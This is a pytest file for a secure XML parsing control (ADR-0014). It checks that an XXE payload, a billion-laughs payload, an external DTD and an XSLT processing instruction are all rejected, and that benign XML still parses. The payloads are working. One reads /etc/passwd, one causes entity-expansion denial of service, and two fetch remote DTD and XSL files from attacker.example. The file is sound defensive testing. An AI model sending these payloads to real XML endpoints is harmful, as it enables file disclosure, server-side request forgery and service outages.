"""ADR-0014 T3/T4 — XXE, external entities, entity expansion (T3) and XSLT (T4).

Control: all untrusted XML is parsed with defusedxml (DTDs, external entities and
entity expansion forbidden) plus a pre-scan that also rejects the XSLT
``xml-stylesheet`` processing instruction.
"""

from __future__ import annotations

import pytest
from app.limits import ParseSandboxError, run_sandboxed
from app.xml_safe import UnsafeXml, parse_xml

XXE = b"""<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">
<data/>"""

XSLT_PI = b"""<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.example/x.xsl"?>
<data>hi</data>"""

BENIGN = b"<data><reading>0.3</reading><reading>0.4</reading></data>"


def test_xxe_external_entity_blocked():
    with pytest.raises(UnsafeXml):
        parse_xml(XXE)


def test_entity_expansion_billion_laughs_blocked():
    with pytest.raises(UnsafeXml):
        parse_xml(BILLION_LAUGHS)


def test_external_dtd_blocked():
    with pytest.raises(UnsafeXml):
        parse_xml(EXTERNAL_DTD)


def test_xslt_stylesheet_pi_blocked():
    with pytest.raises(UnsafeXml):
        parse_xml(XSLT_PI)


def test_benign_xml_parses():
    root = parse_xml(BENIGN)
    assert root.tag == "data"
    assert len(list(root)) == 2


def test_sandboxed_xml_parser_rejects_xxe():
    # The XML parser used by the pipeline (in the sandbox) also refuses XXE:
    # the child raises UnsafeXml and exits non-zero -> ParseSandboxError.
    with pytest.raises(ParseSandboxError):
        run_sandboxed("xml", XXE, timeout_s=10.0)
